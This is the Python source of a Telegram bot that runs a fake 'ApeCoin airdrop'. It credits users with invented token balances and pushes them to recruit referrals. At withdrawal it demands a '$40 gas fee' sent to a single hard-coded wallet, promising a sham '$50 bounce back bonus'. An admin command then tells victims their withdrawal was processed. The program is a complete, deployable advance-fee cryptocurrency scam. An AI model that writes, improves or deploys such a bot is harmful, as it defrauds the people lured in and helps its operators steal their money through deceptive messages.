
import os
import sqlite3
import datetime
import logging
import html
from typing import Optional
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# --- Configuration (env) ---
TOKEN = os.environ.get("APECOIN_BOT_TOKEN") or os.environ.get("TOKEN")
if not TOKEN:
    raise RuntimeError("Missing APECOIN_BOT_TOKEN or TOKEN environment variable")

try:
    ADMIN_ID = int(os.environ.get("APECOIN_ADMIN_ID", "0"))
except ValueError:
    ADMIN_ID = 0

GROUP_LINK = os.environ.get("APECOIN_GROUP_LINK", "https://t.me/Apecoingroupchat")
CHANNEL_LINK = os.environ.get("APECOIN_CHANNEL_LINK", "https://t.me/Apetelegramchannel")
SUPPORT_LINK = os.environ.get("APECOIN_SUPPORT_LINK", "https://t.me/MillionairevaultAi")

BNB_FEE_WALLET = os.environ.get("APECOIN_BNB_WALLET", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
ETH_FEE_WALLET = os.environ.get("APECOIN_ETH_WALLET", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
USDT_BNB = os.environ.get("APECOIN_USDT_BNB", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
USDT_ETH = os.environ.get("APECOIN_USDT_ETH", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")

WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "").rstrip("/")
WEBHOOK_PATH = os.environ.get("WEBHOOK_PATH", TOKEN)
PORT = int(os.environ.get("PORT", "10000"))
HOST = os.environ.get("HOST", "0.0.0.0")

AIRDROP_BONUS = int(os.environ.get("AIRDROP_BONUS", "1000"))
REF_BONUS = int(os.environ.get("REF_BONUS", "200"))
WITHDRAW_YEAR = int(os.environ.get("WITHDRAW_YEAR", "2025"))
WITHDRAW_MONTH = int(os.environ.get("WITHDRAW_MONTH", "11"))
WITHDRAW_DAY = int(os.environ.get("WITHDRAW_DAY", "30"))
WITHDRAW_DATE = datetime.date(WITHDRAW_YEAR, WITHDRAW_MONTH, WITHDRAW_DAY)

# --- Logging ---
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- Database ---
DB_PATH = os.environ.get("DB_PATH", "airdrop.db")
conn = sqlite3.connect(DB_PATH, check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    firstname TEXT,
    username TEXT,
    wallet TEXT,
    balance INTEGER DEFAULT 0,
    referrals INTEGER DEFAULT 0,
    step TEXT DEFAULT 'verify',
    verified INTEGER DEFAULT 0
)
"""
)
conn.commit()

ALLOWED_USER_FIELDS = {"firstname", "username", "wallet", "balance", "referrals", "step", "verified"}

# --- DB helpers ---

def get_user(user_id: int):
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    return cursor.fetchone()


def add_user(user_id: int, firstname: Optional[str]):
    if not get_user(user_id):
        cursor.execute("INSERT INTO users (user_id, firstname, balance) VALUES (?, ?, ?)", (user_id, firstname or "", 0))
        conn.commit()


def update_user(user_id: int, field: str, value):
    if field not in ALLOWED_USER_FIELDS:
        raise ValueError("Invalid user field")
    cursor.execute(f"UPDATE users SET {field}=? WHERE user_id=?", (value, user_id))
    conn.commit()


def get_all_users():
    cursor.execute("SELECT user_id FROM users")
    return [row[0] for row in cursor.fetchall()]

# --- helpers ---

def escape_html(text: str) -> str:
    return html.escape(text or "")

# --- Keyboards ---

def main_menu_markup():
    keyboard = [
        [InlineKeyboardButton("💰 Balance", callback_data="balance"), InlineKeyboardButton("ℹ️ Info", callback_data="info")],
        [InlineKeyboardButton("👥 Referral", callback_data="referral"), InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")],
        [InlineKeyboardButton("👤 Support", callback_data="support")],
    ]
    return InlineKeyboardMarkup(keyboard)


def back_to_main_markup():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 MAIN MENU", callback_data="main_menu")]])

# --- Handlers (keeps gas/bonus text unchanged) ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    firstname = update.effective_user.first_name or ""
    add_user(user_id, firstname)

    if context.args:
        try:
            ref_id = int(context.args[0])
            if ref_id != user_id and get_user(ref_id):
                ref_data = get_user(ref_id)
                new_balance = (ref_data[4] or 0) + REF_BONUS
                new_refs = (ref_data[5] or 0) + 1
                update_user(ref_id, "balance", new_balance)
                update_user(ref_id, "referrals", new_refs)
        except Exception:
            logger.debug("Invalid referral argument")

    await update.message.reply_text(
        f"👋 Hello {firstname}!\n\nTo join the airdrop:\n1️⃣ Join our group: {GROUP_LINK}\n2️⃣ Join our channel: {CHANNEL_LINK}\n\nSend an amazing message to our group (e.g. apecoin to the moon)\nThen send me your Telegram username (e.g. @yourname)."
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = (update.message.text or "").strip()
    user = get_user(user_id)
    if not user:
        return

    step = user[6] if len(user) > 6 else "verify"

    if step == "verify":
        update_user(user_id, "username", text)
        update_user(user_id, "step", "wallet")
        await update.message.reply_text("✅ Thanks! Now send your *ApeCoin Ethereum wallet address*:", parse_mode="Markdown")
        return

    if step == "wallet":
        update_user(user_id, "wallet", text)
        update_user(user_id, "balance", AIRDROP_BONUS)
        update_user(user_id, "step", "done")
        reply_markup = main_menu_markup()
        await update.message.reply_text(
            f"🎉 Welcome! You received {AIRDROP_BONUS} $ApeCoin (~$500).\n\nUse the menu below:",
            reply_markup=reply_markup,
        )
        return

    if step == "withdraw_amount":
        try:
            amt = float(text)
            context.user_data["withdraw_amount"] = amt
            update_user(user_id, "step", "withdraw_wallet")
            await update.message.reply_text("✅ Now send your *Ethereum wallet address* again:", parse_mode="Markdown")
        except ValueError:
            await update.message.reply_text("Please send a valid numeric amount to withdraw.")
        return

    if step == "withdraw_wallet":
        update_user(user_id, "wallet", text)
        update_user(user_id, "step", "done")

        # Preserve your gas/bonus wording unchanged
        await update.message.reply_text(
            f"⚠️ Due to high charges for Ethereum gas fees, please pay *$40 gas fee* to complete withdrawal:\n\n"
            f"🔹 BNB (BEP20): `{BNB_FEE_WALLET}`\n"
            f"🔹 ETH (ERC20): `{ETH_FEE_WALLET}`\n"
            f"🔹 USDT (BNB): `{USDT_BNB}`\n"
            f"🔹 USDT (ETH): `{USDT_ETH}`\n\n"
            f"⚠️ Note immediately after you pay your gas fee, you will receive a bounce back bonus of an additional $50 from the Network if only you are among the first 50,000 users to withdraw your token and also that is verify that our first 50,000 users and other users are not robots , thank you:\n\n"
            "After payment is verified by the Network chain, withdrawal tokens will process  *immediately* ⏳",
            parse_mode="Markdown",
        )

        bot = context.bot
        amt = context.user_data.get("withdraw_amount", user[4])
        msg = (
            "⚠️ *Withdrawal Request*\n\n"
            f"👤 User: [{user_id}](tg://user?id={user_id})\n"
            f"💰 Amount: {amt} $ApeCoin\n"
            f"🏦 Wallet: `{text}`\n\n"
            f"Use /verify {user_id} to mark verified and notify user."
        )
        try:
            await bot.send_message(chat_id=ADMIN_ID, text=msg, parse_mode="Markdown")
        except Exception:
            logger.exception("Failed to notify admin about withdrawal")

        await update.message.reply_text(
            "✅ Withdrawal request submitted successfully!\nOur team will review and verify your transaction soon."
        )
        return


async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    user = get_user(user_id)
    if not user:
        return

    firstname, username, wallet, balance, referrals, step = user[1], user[2], user[3], user[4], user[5], user[6]
    referral_balance = max(balance - AIRDROP_BONUS, 0)
    full_balance = AIRDROP_BONUS + referral_balance
    reflink = f"https://t.me/{context.bot.username}?start={user_id}"

    data = query.data

    if data == "balance":
        msg = (
            f"👤 Hello {firstname}\n\n"
            f"🏆 Airdrop Balance: {AIRDROP_BONUS} $ApeCoin\n"
            f"🎁 Referral Balance: {referral_balance} $ApeCoin\n"
            f"👩‍👦‍👦 Referrals: {referrals}\n\n"
            f"💰 Full Balance: {full_balance} $ApeCoin\n\n"
            f"🗓️ Withdrawals open: {WITHDRAW_DATE.strftime('%d %B %Y')}\n"
            f"⚠️ Need 7 referrals to withdraw.\n\n"
            f"🔗 Referral link:\n[Click here to invite friends]({reflink})"
        )
        await query.edit_message_text(msg, parse_mode="MarkdownV2", disable_web_page_preview=True, reply_markup=back_to_main_markup())
        return

    elif data == "info":
        msg = (
            "ℹ️ *Airdrop Info*\n\n"
            f"✅ Signup Bonus: {AIRDROP_BONUS} $ApeCoin (~$500)\n"
            f"👥 Referral Reward: {REF_BONUS} $ApeCoin (~$100)\n"
            f"💸 Withdrawals: {WITHDRAW_DATE.strftime('%d %B %Y')}\n"
           "🎁 *First 50,000 users to withdraw will receive an additional $50 bonus from the Network Chain!*\n\n"
            "🚀 Keep inviting friends!"
        )
        await query.edit_message_text(msg, parse_mode="MarkdownV2", reply_markup=back_to_main_markup())
        return

    elif data == "referral":
        msg = (
            f"👥 Your referral link:\n"
            f"[Click here to invite friends]({reflink})\n\n"
            f"Earn {REF_BONUS} $ApeCoin per friend!"
        )
        await query.edit_message_text(msg, parse_mode="MarkdownV2", reply_markup=back_to_main_markup())
        return

    elif data == "support":
        today = datetime.date.today()
        if today <= WITHDRAW_DATE + datetime.timedelta(days=3):
            msg = (
                f"👋 Hello {firstname}, we're excited to have you here!\n\n"
                f"💰 Your current balance: {full_balance} $ApeCoin\n\n"
                f"🗓️ Withdrawals will open after {WITHDRAW_DATE.strftime('%d %B %Y')}.\n\n"
                "🎁 *First 50,000 users to withdraw will receive an additional $50 bonus from the Network Chain!*\n\n"
                f"👉 [Message Support]({SUPPORT_LINK})"
            )
        else:
            msg = (
                "👤 *Support Center*\n\n"
                "If you have any problem with:\n\n"
                "- Paying withdrawal gas fee\n"
                "- Want to pay with other coins\n"
                "- Receiving ApeCoin Airdrop tokens\n"
                "- Swapping ApeCoin tokens\n"
                "- Transferring ApeCoin tokens\n\n"
                f"👉 [Message Support]({SUPPORT_LINK})"
            )
        await query.edit_message_text(msg, parse_mode="Markdown", disable_web_page_preview=True, reply_markup=back_to_main_markup())
        return

    elif data == "main_menu":
        await query.edit_message_text(f"👋 {firstname}! Use the menu below:", reply_markup=main_menu_markup())
        return

    elif data == "withdraw":
        today = datetime.date.today()
        if today < WITHDRAW_DATE:
            await query.edit_message_text(f"⚠️ Withdrawals locked until {WITHDRAW_DATE.strftime('%d %B %Y')}", reply_markup=back_to_main_markup())
        else:
            update_user(user_id, "step", "withdraw_amount")
            await query.edit_message_text("💸 Enter the *amount of $ApeCoin* to withdraw:", parse_mode="Markdown", reply_markup=back_to_main_markup())
        return

# ------------------ Admin commands ------------------
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return await update.message.reply_text("❌ Not authorized")

    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]

    cursor.execute("SELECT SUM(referrals) FROM users")
    total_refs = cursor.fetchone()[0] or 0

    cursor.execute("SELECT SUM(balance) FROM users")
    total_balance = cursor.fetchone()[0] or 0

    msg = (
        f"📊 Bot Stats:\n"
        f"👥 Total Users: {total_users}\n"
        f"👥 Total Referrals: {total_refs}\n"
        f"💰 Total Distributed: {total_balance} $ApeCoin"
    )
    await update.message.reply_text(msg)


async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 You are not authorized to use this command.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return

    message_text = " ".join(context.args)
    users = get_all_users()
    count = 0
    for uid in users:
        try:
            await context.bot.send_message(chat_id=uid, text=message_text)
            count += 1
        except Exception:
            pass

    await update.message.reply_text(f"✅ Broadcast sent to {count} users.")


async def send_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return await update.message.reply_text("🚫 You are not authorized to use this command.")
    if len(context.args) < 2:
        return await update.message.reply_text("Usage: /send <user_id> <message>")

    try:
        target_id = int(context.args[0])
        message_text = " ".join(context.args[1:])
        await context.bot.send_message(chat_id=target_id, text=message_text)
        await update.message.reply_text(f"✅ Message sent to user {target_id}.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Failed to send message: {e}")


async def verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 Not authorized")
        return
    if not context.args:
        await update.message.reply_text("Usage: /verify <user_id>")
        return
    try:
        uid = int(context.args[0])
        update_user(uid, "verified", 1)
        await context.bot.send_message(chat_id=uid, text="✅ Your withdrawal has been verified and processed successfully!")
        await update.message.reply_text(f"✅ User {uid} notified of verification.")
    except ValueError:
        await update.message.reply_text("Invalid user ID. Please provide a numeric ID.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error verifying user: {e}")

# ------------------ Setup & run webhook ------------------
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("send", send_user))
    app.add_handler(CommandHandler("verify", verify))

    webhook_url = None
    if WEBHOOK_URL:
        webhook_url = f"{WEBHOOK_URL}/{WEBHOOK_PATH}"
        logger.info("Configured webhook URL: %s", webhook_url)

    # run built-in webhook server
    app.run_webhook(listen=HOST, port=PORT, url_path=WEBHOOK_PATH, webhook_url=webhook_url)


if __name__ == "__main__":
    main()
